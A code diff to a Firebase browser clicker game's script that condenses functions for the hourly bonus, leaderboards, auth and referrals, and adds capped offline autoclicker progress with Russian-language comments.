-          const timeRemaining = Math.max(0, oneHour - timeSinceLastClaim);
-
-          if (timeRemaining <= 0) {
-            document.getElementById("claimBonusBtn").disabled = false;
-            document.getElementById("bonusTimer").innerText = "Claim now!";
-          } else {
-            document.getElementById("claimBonusBtn").disabled = true;
-            const hours = Math.floor(timeRemaining / 3600000);
-            const minutes = Math.floor((timeRemaining % 3600000) / 60000);
-            const seconds = Math.floor((timeRemaining % 60000) / 1000);
-            document.getElementById("bonusTimer").innerText = `Next in: ${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-          }
+        db.ref(`hourlyBonus/${user.uid}`).once("value").then(s => {
+          const d = s.val() || { lastClaim: 0 }, tr = Math.max(0, 3600000 - (Date.now() - d.lastClaim));
+          if (tr <= 0) { document.getElementById("claimBonusBtn").disabled = false; document.getElementById("bonusTimer").innerText = "Claim now!"; }
+          else { document.getElementById("claimBonusBtn").disabled = true; const h = Math.floor(tr/3600000), m = Math.floor((tr%3600000)/60000), sec = Math.floor((tr%60000)/1000); document.getElementById("bonusTimer").innerText = `Next: ${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${sec.toString().padStart(2,'0')}`; }
         });
       }, 1000);
     }
 
     function claimHourlyBonus() {
-      if (!user) {
-        showMessage("Please sign in to claim the bonus.", true);
-        return;
-      }
-
-      db.ref(`hourlyBonus/${user.uid}`).once("value").then(snapshot => {
-        const data = snapshot.val() || { lastClaim: 0 };
-        const now = Date.now();
-        const timeSinceLastClaim = now - data.lastClaim;
-        const oneHour = 3600000;
-
-        if (timeSinceLastClaim >= oneHour || !data.lastClaim) {
-          const reward = Math.floor(Math.random() * (200 - 10 + 1)) + 10;
-
-          db.ref(`leaderboard/${user.uid}/score`).transaction(currentScore => {
-            return (currentScore || 0) + reward;
-          }).then(transactionResult => {
-            if (transactionResult.committed) {
-              score = transactionResult.snapshot.val();
-              updateCounterDisplay();
-              showMessage(`✅ Claimed ${reward} tokens!`, true);
-              db.ref(`hourlyBonus/${user.uid}`).set({ lastClaim: now });
-              document.getElementById("claimBonusBtn").disabled = true;
-              startBonusTimer();
-            }
-          });
-        } else {
-          showMessage("Bonus not ready yet!", true);
-        }
+      if (!user) return showMessage("Sign in.", true);
+      db.ref(`hourlyBonus/${user.uid}`).once("value").then(s => {
+        const d = s.val() || { lastClaim: 0 };
+        if (Date.now() - d.lastClaim >= 3600000 || !d.lastClaim) {
+          const rw = Math.floor(Math.random() * 191) + 10;
+          db.ref(`leaderboard/${user.uid}/score`).transaction(cs => (cs||0)+rw).then(tr => { if (tr.committed) { score = tr.snapshot.val(); updateCounterDisplay(); showMessage(`✅ +${rw} tokens!`, true); db.ref(`hourlyBonus/${user.uid}`).set({ lastClaim: Date.now() }); document.getElementById("claimBonusBtn").disabled = true; startBonusTimer(); } });
+        } else showMessage("Not ready!", true);
       });
     }
 
-    function startOnlineTimer() {
-      if (onlineTimer) return;
-      onlineTimer = setInterval(() => {
-        if (user) {
-          onlineTime++;
-          updateTaskProgress("onlineTime", 1);
-          if (onlineTime % 60 === 0) {
-            db.ref(`leaderboard/${user.uid}`).update({
-              onlineTime: onlineTime,
-              lastUpdate: Date.now()
-            });
-          }
-        }
-      }, 1000);
-    }
+    function startOnlineTimer() { if (onlineTimer) return; onlineTimer = setInterval(() => { if (user) { onlineTime++; updateTaskProgress("onlineTime", 1); if (onlineTime % 60 === 0) db.ref(`leaderboard/${user.uid}`).update({ onlineTime, lastUpdate: Date.now() }); } }, 1000); }
+    function stopOnlineTimer() { if (onlineTimer) { clearInterval(onlineTimer); onlineTimer = null; } }
 
-    function stopOnlineTimer() {
-      if (onlineTimer) {
-        clearInterval(onlineTimer);
-        onlineTimer = null;
-      }
-    }
-
-    // Leaderboard
+    // ==================== LEADERBOARD ====================
     function showTab(tab) {
       currentTab = tab;
-      const overallBtn = document.getElementById("overallTabBtn");
-      const weeklyBtn = document.getElementById("weeklyTabBtn");
-
-      if (tab === "overall") {
-        overallBtn.classList.add("active");
-        weeklyBtn.classList.remove("active");
-        document.getElementById("tableHeader").innerHTML = "<tr><th>#</th><th>Player</th><th>Tokens</th></tr>";
-      } else {
-        overallBtn.classList.remove("active");
-        weeklyBtn.classList.add("active");
-        document.getElementById("tableHeader").innerHTML = "<tr><th>#</th><th>Player</th><th>Tokens</th><th>Reward</th></tr>";
-      }
+      if (tab === "overall") { document.getElementById("overallTabBtn").classList.add("active"); document.getElementById("weeklyTabBtn").classList.remove("active"); document.getElementById("tableHeader").innerHTML = "<tr><th>#</th><th>Player</th><th>Tokens</th></tr>"; }
+      else { document.getElementById("overallTabBtn").classList.remove("active"); document.getElementById("weeklyTabBtn").classList.add("active"); document.getElementById("tableHeader").innerHTML = "<tr><th>#</th><th>Player</th><th>Tokens</th><th>Reward</th></tr>"; }
     }
 
-    function updateWeeklyScore() {
-      if (!user) return;
-      const weekKey = getWeekKey();
-      const userName = user.displayName || `Player_${user.uid.slice(0, 8)}`;
-      db.ref(`weeklyLeaderboard/${weekKey}/${user.uid}`).update({
-        id: user.uid,
-        name: userName,
-        score: score,
-        lastUpdate: Date.now()
-      });
-    }
-
-    function checkWeeklyReset() {
-      const weekKey = getWeekKey();
-      db.ref(`weeklyLeaderboard/lastReset`).once("value").then(snapshot => {
-        const lastReset = snapshot.val() || 0;
-        const oneWeek = 7 * 24 * 60 * 60 * 1000;
-        if (Date.now() - lastReset >= oneWeek) {
-          db.ref(`weeklyLeaderboard/${weekKey}`).remove();
-          db.ref(`weeklyLeaderboard/lastReset`).set(Date.now());
-        }
-      });
-    }
+    function updateWeeklyScore() { if (user) db.ref(`weeklyLeaderboard/${getWeekKey()}/${user.uid}`).update({ id: user.uid, name: user.displayName || `Player_${user.uid.slice(0,8)}`, score, lastUpdate: Date.now() }); }
+    function checkWeeklyReset() { db.ref("weeklyLeaderboard/lastReset").once("value").then(s => { if (Date.now() - (s.val()||0) >= 604800000) { db.ref(`weeklyLeaderboard/${getWeekKey()}`).remove(); db.ref("weeklyLeaderboard/lastReset").set(Date.now()); } }); }
 
     function submitScore() {
       if (!user) return;
-
-      const userName = user.displayName || `Player_${user.uid.slice(0, 8)}`;
-      db.ref("leaderboard/" + user.uid).update({
-        id: user.uid,
-        name: userName,
-        score: score,
-        crystals: crystals,
-        clickPower: clickPower,
-        autoclickActive: autoclickActive,
-        autoclickEndTime: autoclickEndTime,
-        tempBoostActive: !!tempBoostTimeout,
-        tempBoostEndTime: tempBoostTimeout ? tempBoostEndTime : 0,
-        lastUpdate: Date.now()
-      });
-
+      db.ref("leaderboard/" + user.uid).update({ id: user.uid, name: user.displayName || `Player_${user.uid.slice(0,8)}`, score, crystals, clickPower, autoclickActive, autoclickEndTime, tempBoostActive: !!tempBoostTimeout, tempBoostEndTime: tempBoostTimeout ? tempBoostEndTime : 0, lastUpdate: Date.now() });
       if (score >= 50000) updateWeeklyScore();
     }
 
+    // ==================== LOAD/SAVE WITH OFFLINE PROGRESS ====================
     function loadPlayerData(uid) {
       db.ref("leaderboard/" + uid).once("value").then(snapshot => {
         const data = snapshot.val();
@@ -1860,9 +932,27 @@
           autoclickEndTime = data.autoclickEndTime || 0;
           autoclickerLevel = data.autoclickerLevel || 1;
 
+          // ===== ВОССТАНОВЛЕНИЕ АВТОКЛИКЕРА =====
           if (autoclickActive && autoclickEndTime > Date.now()) {
-            const remainingTime = autoclickEndTime - Date.now();
-            startAutoclicker(remainingTime, false);
+            const remaining = autoclickEndTime - Date.now();
+            // Ограничиваем оффлайн-прогресс 4 часами
+            const offlineProgress = Math.min(remaining, OFFLINE_LIMIT);
+            if (offlineProgress > 0) {
+              // Начисляем токены за время отсутствия (50% от обычной скорости)
+              const offlineSeconds = Math.floor(offlineProgress / 1000);
+              const offlineTokens = Math.floor(offlineSeconds * clickPower * 0.5);
+              if (offlineTokens > 0) {
+                db.ref(`leaderboard/${uid}/score`).transaction(cs => (cs || 0) + offlineTokens).then(() => {
+                  score += offlineTokens;
+                  showMessage(`⏰ Offline: +${offlineTokens} tokens (${Math.floor(offlineSeconds/60)}min)`);
+                  updateCounterDisplay();
+                });
+              }
+              // Запускаем автокликер на оставшееся время
+              startAutoclicker(remaining, false);
+            } else {
+              stopAutoclicker();
+            }
           } else if (autoclickActive) {
             stopAutoclicker();
           }
@@ -1879,249 +969,108 @@
         }
       });
 
-      db.ref("achievements/" + uid).once("value").then(snapshot => {
-        const data = snapshot.val();
-        if (data) {
-          achievements = data;
-          renderAchievements();
-        }
-      });
+      db.ref("achievements/" + uid).once("value").then(s => { if (s.val()) { achievements = s.val(); renderAchievements(); } });
     }
 
-    // Auth functions
+    // ==================== AUTH ====================
     function signInWithGoogle() {
-      const provider = new firebase.auth.GoogleAuthProvider();
-      auth.signInWithPopup(provider).then(result => {
-        user = result.user;
+      auth.signInWithPopup(new firebase.auth.GoogleAuthProvider()).then(r => {
+        user = r.user;
         document.getElementById("authSection").style.display = "none";
         document.getElementById("gameSection").style.display = "block";
         loadPlayerData(user.uid);
         submitScore();
-        
-        const urlParams = new URLSearchParams(window.location.search);
-        const referrerUid = urlParams.get('ref');
-        if (referrerUid) {
-          saveReferrer(referrerUid);
-          window.history.replaceState({}, document.title, window.location.pathname);
-        }
-      }).catch(error => {
-        showMessage("Google sign-in failed.");
-        console.error(error);
-      });
+        const ref = new URLSearchParams(window.location.search).get('ref');
+        if (ref) { saveReferrer(ref); window.history.replaceState({}, document.title, window.location.pathname); }
+      }).catch(() => showMessage("Sign-in failed."));
     }
 
     function signOut() {
       stopOnlineTimer();
-      stopAutoclicker();
-      
-      if (tempBoostTimeout) {
-        clearTimeout(tempBoostTimeout);
-        tempBoostTimeout = null;
+      // НЕ вызываем stopAutoclicker() — сохраняем время в БД
+      if (autoclickInterval) {
+        clearInterval(autoclickInterval);
+        autoclickInterval = null;
       }
+      if (tempBoostTimeout) { clearTimeout(tempBoostTimeout); tempBoostTimeout = null; }
+      if (superAutoclickInterval) { clearInterval(superAutoclickInterval); superAutoclickInterval = null; }
+      if (bonusTimerInterval) { clearInterval(bonusTimerInterval); bonusTimerInterval = null; }
       
-      if (superAutoclickInterval) {
-        clearInterval(superAutoclickInterval);
-        superAutoclickInterval = null;
-      }
-      
-      if (bonusTimerInterval) {
-        clearInterval(bonusTimerInterval);
-        bonusTimerInterval = null;
+      // Сохраняем состояние перед выходом
+      if (user && autoclickActive) {
+        db.ref("leaderboard/" + user.uid).update({
+          autoclickActive: true,
+          autoclickEndTime: autoclickEndTime,
+          lastUpdate: Date.now()
+        }).catch(() => {});
       }
       
       auth.signOut().then(() => {
         user = null;
-        score = 0;
-        clickPower = 1;
-        autoclickEndTime = 0;
-        onlineTime = 0;
+        score = 0; clickPower = 1; autoclickEndTime = 0; onlineTime = 0;
         document.getElementById("authSection").style.display = "block";
         document.getElementById("gameSection").style.display = "none";
-        updateCounterDisplay();
-        updateClickPowerBar();
-        updateProfilePanel();
-        showMessage("You have been signed out.");
+        updateCounterDisplay(); updateClickPowerBar(); updateProfilePanel();
+        showMessage("Signed out. Progress saved!");
       });
     }
 
-    function saveReferrer(referrerUid) {
-      if (!user || !referrerUid || isProcessingReferrer) return;
+    function saveReferrer(ruid) {
+      if (!user || !ruid || isProcessingReferrer) return;
       isProcessingReferrer = true;
-
-      db.ref(`leaderboard/${user.uid}`).once('value').then(snapshot => {
-        const userData = snapshot.val();
-        if (userData && userData.referral_bonus_claimed) {
-          isProcessingReferrer = false;
-          return;
-        }
-
-        db.ref(`leaderboard/${referrerUid}`).once('value').then(referrerSnapshot => {
-          if (!referrerSnapshot.exists()) {
-            isProcessingReferrer = false;
-            return;
-          }
-
-          score += 50;
-          showMessage('Referral bonus: +50 tokens!');
-          updateCounterDisplay();
-
-          db.ref(`leaderboard/${user.uid}`).update({
-            referrer_uid: referrerUid,
-            referral_bonus_claimed: true,
-            score: score,
-            lastUpdate: Date.now()
-          });
-
-          db.ref(`referrals/${referrerUid}/${user.uid}`).set({
-            invited_at: Date.now(),
-            tokens_earned: 0,
-            reward_claimed: false
-          });
-
-          submitScore();
-          isProcessingReferrer = false;
+      db.ref(`leaderboard/${user.uid}`).once('value').then(s => {
+        if (s.val()?.referral_bonus_claimed) { isProcessingReferrer = false; return; }
+        db.ref(`leaderboard/${ruid}`).once('value').then(rs => {
+          if (!rs.exists()) { isProcessingReferrer = false; return; }
+          score += 50; showMessage('+50 referral tokens!'); updateCounterDisplay();
+          db.ref(`leaderboard/${user.uid}`).update({ referrer_uid: ruid, referral_bonus_claimed: true, score, lastUpdate: Date.now() });
+          db.ref(`referrals/${ruid}/${user.uid}`).set({ invited_at: Date.now(), tokens_earned: 0, reward_claimed: false });
+          submitScore(); isProcessingReferrer = false;
         });
       });
     }
 
-    // ============================================
-    // Mobile/Tablet menu toggle
-    // ============================================
+    // ==================== MOBILE MENU ====================
     const profilePanel = document.getElementById('profilePanel');
+    function isMobileOrTablet() { return window.innerWidth <= 1023; }
+    if (isMobileOrTablet()) profilePanel.classList.remove('expanded'); else profilePanel.classList.add('expanded');
+    profilePanel.addEventListener('click', function(e) { if (e.target.tagName === 'BUTTON' || e.target.tagName === 'INPUT' || e.target.tagName === 'A') return; if (isMobileOrTablet()) this.classList.toggle('expanded'); });
+    window.addEventListener('resize', () => { if (isMobileOrTablet()) profilePanel.classList.remove('expanded'); else profilePanel.classList.add('expanded'); });
 
-    function isMobileOrTablet() {
-      return window.innerWidth <= 1023;
-    }
-
-    // Init
-    if (isMobileOrTablet()) {
-      profilePanel.classList.remove('expanded');
-    } else {
-      profilePanel.classList.add('expanded');
-    }
-
-    // Click handler
-    profilePanel.addEventListener('click', function(e) {
-      if (e.target.tagName === 'BUTTON' || e.target.tagName === 'INPUT' || e.target.tagName === 'A') {
-        return;
-      }
-      
-      if (isMobileOrTablet()) {
-        this.classList.toggle('expanded');
-      }
+    // ==================== AUTH OBSERVER ====================
+    auth.onAuthStateChanged(cu => {
+      if (cu) { user = cu; document.getElementById("authSection").style.display = "none"; document.getElementById("gameSection").style.display = "block"; loadPlayerData(user.uid); startBonusTimer(); }
+      else { if (bonusTimerInterval) clearInterval(bonusTimerInterval); document.getElementById("claimBonusBtn").disabled = true; document.getElementById("bonusTimer").innerText = "Sign in to claim"; }
     });
 
-    // Resize handler
-    window.addEventListener('resize', () => {
-      if (isMobileOrTablet()) {
-        profilePanel.classList.remove('expanded');
-      } else {
-        profilePanel.classList.add('expanded');
-      }
-    });
-
-    // Auth state observer
-    auth.onAuthStateChanged(currentUser => {
-      if (currentUser) {
-        user = currentUser;
-        document.getElementById("authSection").style.display = "none";
-        document.getElementById("gameSection").style.display = "block";
-        loadPlayerData(user.uid);
-        startBonusTimer();
-      } else {
-        if (bonusTimerInterval) clearInterval(bonusTimerInterval);
-        document.getElementById("claimBonusBtn").disabled = true;
-        document.getElementById("bonusTimer").innerText = "Sign in to claim";
-      }
-    });
-
-    // Leaderboard listeners
-    db.ref("leaderboard").on("value", snapshot => {
+    // ==================== LEADERBOARD LISTENERS ====================
+    db.ref("leaderboard").on("value", s => {
       if (currentTab !== "overall") return;
-      const leaderboardBody = document.getElementById("leaderboardBody");
-      const data = [];
-
-      snapshot.forEach(child => {
-        const entry = child.val();
-        if (entry && entry.score !== undefined && entry.name) {
-          data.push({ id: entry.id, name: entry.name, score: entry.score });
-        }
-      });
-
-      data.sort((a, b) => b.score - a.score);
-      leaderboardBody.innerHTML = "";
-
-      if (data.length === 0) {
-        leaderboardBody.innerHTML = "<tr><td colspan='3'>No players yet</td></tr>";
-        return;
-      }
-
-      data.slice(0, 10).forEach((entry, index) => {
-        leaderboardBody.innerHTML += `<tr><td>${index + 1}</td><td>${entry.name}</td><td>${entry.score}</td></tr>`;
-      });
+      const data = []; s.forEach(c => { const e = c.val(); if (e?.score !== undefined && e.name) data.push(e); });
+      data.sort((a,b) => b.score - a.score);
+      document.getElementById("leaderboardBody").innerHTML = data.length === 0 ? "<tr><td colspan='3'>No players</td></tr>" : data.slice(0,10).map((e,i) => `<tr><td>${i+1}</td><td>${e.name}</td><td>${e.score}</td></tr>`).join('');
     });
 
-    function listenToWeeklyLeaderboard() {
-      const weekKey = getWeekKey();
-      db.ref(`weeklyLeaderboard/${weekKey}`).on("value", snapshot => {
-        if (currentTab !== "weekly") return;
-        const leaderboardBody = document.getElementById("leaderboardBody");
-        const data = [];
+    db.ref(`weeklyLeaderboard/${getWeekKey()}`).on("value", s => {
+      if (currentTab !== "weekly") return;
+      const data = []; s.forEach(c => { const e = c.val(); if (e?.score >= 50000 && e.name) data.push(e); });
+      data.sort((a,b) => b.score - a.score);
+      document.getElementById("leaderboardBody").innerHTML = data.length === 0 ? "<tr><td colspan='4'>No players</td></tr>" : data.slice(0,10).map((e,i) => `<tr><td>${i+1}</td><td>${e.name}</td><td>${e.score}</td><td>${e.rewardClaimed ? getRewardForRank(i+1)+' (Claimed)' : getRewardForRank(i+1)}</td></tr>`).join('');
+    });
 
-        snapshot.forEach(child => {
-          const entry = child.val();
-          if (entry && entry.score >= 50000 && entry.name) {
-            data.push({ id: entry.id, name: entry.name, score: entry.score, rewardClaimed: entry.rewardClaimed || false });
-          }
-        });
-
-        data.sort((a, b) => b.score - a.score);
-        leaderboardBody.innerHTML = "";
-
-        if (data.length === 0) {
-          leaderboardBody.innerHTML = "<tr><td colspan='4'>No players with 50,000+ tokens this week</td></tr>";
-          return;
-        }
-
-        data.slice(0, 10).forEach((entry, index) => {
-          const reward = getRewardForRank(index + 1);
-          const rewardText = entry.rewardClaimed ? `${reward} (Claimed)` : reward;
-          leaderboardBody.innerHTML += `<tr><td>${index + 1}</td><td>${entry.name}</td><td>${entry.score}</td><td>${rewardText}</td></tr>`;
-        });
-      });
-    }
-
-    listenToWeeklyLeaderboard();
     showTab("overall");
-    setInterval(checkWeeklyReset, 10 * 60 * 1000);
+    setInterval(checkWeeklyReset, 600000);
+    setInterval(() => { if (user) { updateProfilePanel(); if (score > 0) submitScore(); } }, 1000);
 
-    // Periodic updates
-    setInterval(() => {
-      if (user) {
-        updateProfilePanel();
-        if (score > 0) submitScore();
-      }
-    }, 1000);
+    // ==================== MOTIVATIONAL PHRASES ====================
+    let mi = 0; const me = document.getElementById("motiveText");
+    setInterval(() => { me.style.opacity = 0; setTimeout(() => { mi = (mi+1) % motivationalPhrases.length; me.innerText = motivationalPhrases[mi]; me.style.opacity = 1; }, 500); }, 3000);
 
-    // Motivational phrases
-    let motiveIndex = 0;
-    const motiveElement = document.getElementById("motiveText");
-    setInterval(() => {
-      motiveElement.style.opacity = 0;
-      setTimeout(() => {
-        motiveIndex = (motiveIndex + 1) % motivationalPhrases.length;
-        motiveElement.innerText = motivationalPhrases[motiveIndex];
-        motiveElement.style.opacity = 1;
-      }, 500);
-    }, 3000);
+    // ==================== PARTICLES ====================
+    document.addEventListener("DOMContentLoaded", () => particlesJS("particles-js", { particles: { number: { value: 0 }, color: { value: "#ffd700" }, shape: { type: "circle" }, size: { value: 5, random: true }, move: { enable: true, speed: 10, direction: "top", out_mode: "out" } }, interactivity: { events: { onclick: { enable: false }, onhover: { enable: false } } } }));
   </script>
 
   <script async src="https://www.googletagmanager.com/gtag/js?id=G-G76GTQQKG0"></script>
-  <script>
-    window.dataLayer = window.dataLayer || [];
-    function gtag(){dataLayer.push(arguments);}
-    gtag('js', new Date());
-    gtag('config', 'G-G76GTQQKG0');
-  </script>
+  <script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());gtag('config','G-G76GTQQKG0');</script>
 </body>
 </html>
